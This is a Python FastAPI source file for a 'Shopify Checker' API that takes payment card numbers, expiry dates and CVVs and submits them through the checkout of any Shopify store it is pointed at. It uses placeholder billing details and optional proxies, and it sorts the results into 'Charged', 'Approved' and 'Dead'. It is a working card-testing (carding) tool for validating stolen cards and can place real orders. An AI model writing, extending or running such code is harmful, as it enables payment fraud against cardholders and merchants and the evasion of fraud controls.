# api.py – Robust Shopify Checker
import os
import re
import json
from typing import Optional
from urllib.parse import urljoin
from contextlib import asynccontextmanager

import httpx
from fastapi import FastAPI, Query, HTTPException
from fastapi.responses import JSONResponse

# ─── Lifespan ────────────────────────────────────────────────────────
@asynccontextmanager
async def lifespan(app: FastAPI):
    yield
    await client.aclose()

app = FastAPI(title="Shopify Checker API", lifespan=lifespan)

# ─── HTTP client ────────────────────────────────────────────────────
client = httpx.AsyncClient(
    timeout=httpx.Timeout(30.0, connect=10.0),
    limits=httpx.Limits(max_keepalive_connections=100, max_connections=200),
    follow_redirects=True,
)

# ─── Helpers ──────────────────────────────────────────────────────────
def extract_cc(cc: str):
    parts = cc.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid card format. Use: number|month|year|cvv")
    return parts[0], parts[1], parts[2], parts[3]

def format_proxy(proxy: Optional[str]) -> Optional[str]:
    if not proxy:
        return None
    if "://" in proxy:
        return proxy
    parts = proxy.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return proxy

# ─── Core checker (with full error trapping) ────────────────────────
async def check_site(site: str, card_number: str, month: str, year: str, cvv: str, proxy: Optional[str] = None):
    if not site.startswith(('http://', 'https://')):
        site = f'https://{site}'

    proxy_url = format_proxy(proxy)

    async def fetch(session: httpx.AsyncClient, url: str, **kwargs):
        if proxy_url:
            kwargs['proxy'] = proxy_url
        return await session.get(url, **kwargs)

    async def post(session: httpx.AsyncClient, url: str, data=None, json=None, **kwargs):
        if proxy_url:
            kwargs['proxy'] = proxy_url
        return await session.post(url, data=data, json=json, **kwargs)

    try:
        # ─── 1. Get product ──────────────────────────────────────────
        products_url = urljoin(site, "/products.json?limit=1")
        resp = await fetch(client, products_url)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Failed to fetch products (HTTP {resp.status_code})", "price": "-", "gateway": "Shopify"}
        data = resp.json()
        products = data.get("products", [])
        if not products:
            return {"status": "error", "message": "No products found on this store", "price": "-", "gateway": "Shopify"}
        variant = products[0].get("variants", [])
        if not variant:
            return {"status": "error", "message": "No variants found", "price": "-", "gateway": "Shopify"}
        variant_id = variant[0]["id"]
        price = variant[0].get("price", "0.00")

        # ─── 2. Add to cart ──────────────────────────────────────────
        add_url = urljoin(site, "/cart/add.js")
        add_data = {"id": variant_id, "quantity": 1}
        resp = await post(client, add_url, json=add_data)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Failed to add to cart (HTTP {resp.status_code})", "price": price, "gateway": "Shopify"}

        # ─── 3. Load checkout ────────────────────────────────────────
        checkout_url = urljoin(site, "/checkout")
        resp = await fetch(client, checkout_url)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Failed to load checkout (HTTP {resp.status_code})", "price": price, "gateway": "Shopify"}
        html = resp.text

        token_match = re.search(r'name="authenticity_token" value="([^"]+)"', html)
        if not token_match:
            return {"status": "error", "message": "Authenticity token not found", "price": price, "gateway": "Shopify"}
        token = token_match.group(1)

        # ─── 4. Submit payment ──────────────────────────────────────
        payment_data = {
            "authenticity_token": token,
            "checkout[email]": "john.doe@example.com",
            "checkout[billing_address][first_name]": "John",
            "checkout[billing_address][last_name]": "Doe",
            "checkout[billing_address][address1]": "123 Main St",
            "checkout[billing_address][city]": "New York",
            "checkout[billing_address][province]": "NY",
            "checkout[billing_address][zip]": "10001",
            "checkout[billing_address][country]": "US",
            "checkout[billing_address][phone]": "+1234567890",
            "checkout[remember_me]": "0",
            "checkout[consents][email_marketing]": "0",
            "checkout[credit_card][vault]": "0",
            "checkout[credit_card][number]": card_number,
            "checkout[credit_card][month]": month,
            "checkout[credit_card][year]": year,
            "checkout[credit_card][verification_value]": cvv,
            "button": "",
            "checkout[shipping_rate][id]": "",
            "checkout[client_details][browser_width]": "1024",
            "checkout[client_details][browser_height]": "768",
            "checkout[client_details][javascript_enabled]": "1",
            "checkout[client_details][color_depth]": "24",
            "checkout[client_details][accept_language]": "en-US",
            "checkout[client_details][user_agent]": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        }
        rate_match = re.search(r'name="checkout\[shipping_rate\]\[id\]" value="([^"]+)"', html)
        if rate_match:
            payment_data["checkout[shipping_rate][id]"] = rate_match.group(1)

        resp = await post(client, checkout_url, data=payment_data)
        if resp.status_code != 200:
            return {"status": "error", "message": f"Checkout HTTP {resp.status_code}", "price": price, "gateway": "Shopify"}

        # ─── 5. Analyse response ─────────────────────────────────────
        response_text = resp.text
        response_lower = response_text.lower()

        if "thank you" in response_lower or "order_confirmation" in response_lower:
            return {"status": "Charged", "message": "Order placed successfully", "price": price, "gateway": "Shopify"}
        elif "processing" in response_lower or "review" in response_lower:
            return {"status": "3DS", "message": "3D Secure required", "price": price, "gateway": "Shopify"}
        elif "declined" in response_lower or "insufficient" in response_lower:
            return {"status": "Approved", "message": "Card declined (insufficient funds)", "price": price, "gateway": "Shopify"}
        elif "cvv" in response_lower or "incorrect" in response_lower:
            return {"status": "Approved", "message": "Invalid CVV", "price": price, "gateway": "Shopify"}
        else:
            return {"status": "Dead", "message": "Unknown response", "price": price, "gateway": "Shopify"}

    except Exception as e:
        return {"status": "error", "message": str(e)[:150], "price": "-", "gateway": "Shopify"}

# ─── Endpoint ─────────────────────────────────────────────────────────
@app.get("/shopify/check")
async def shopify_check(
    site: str = Query(..., description="Shopify store domain"),
    cc: str = Query(..., description="Card: number|month|year|cvv"),
    proxy: Optional[str] = Query(None, description="Optional proxy"),
):
    try:
        card_number, month, year, cvv = extract_cc(cc)
    except ValueError as e:
        raise HTTPException(status_code=400, detail=str(e))

    # Wrap the entire check to catch any unexpected error
    try:
        result = await check_site(site, card_number, month, year, cvv, proxy)
        return JSONResponse(content=result)
    except Exception as e:
        return JSONResponse(
            status_code=200,
            content={"status": "error", "message": f"Unexpected error: {str(e)[:150]}", "price": "-", "gateway": "Shopify"}
        )

# ─── Health check ─────────────────────────────────────────────────────
@app.get("/")
@app.get("/health")
async def health():
    return {"status": "ok", "service": "Shopify Checker API"}

# ─── Main (for local testing) ────────────────────────────────────────
if __name__ == "__main__":
    import uvicorn
    port = int(os.getenv("PORT", 7070))
    uvicorn.run(app, host="0.0.0.0", port=port)
